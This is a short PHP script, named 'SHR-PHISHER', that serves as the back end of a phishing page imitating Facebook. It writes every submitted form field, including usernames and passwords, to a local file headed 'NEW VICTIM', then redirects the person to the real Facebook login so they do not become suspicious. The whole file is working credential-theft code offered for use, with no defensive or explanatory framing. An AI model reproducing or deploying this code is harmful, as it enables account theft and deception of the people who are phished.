<?php
// PHP Script to capture user credentials (SHR-PHISHER)
$handle = fopen("usernames.txt", "a");
$date = date('Y-m-d H:i:s');
fwrite($handle, "---------- NEW VICTIM (FACEBOOK REAL LOOK) - $date ----------\n");

// Capturing all inputs without removing anything from your original code
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fwrite($handle, "------------------------------------------------------------\n\n");
fclose($handle);

// Redirect the user back to official Facebook to avoid suspicion
header("Location: https://www.facebook.com/login/");
exit;
?>
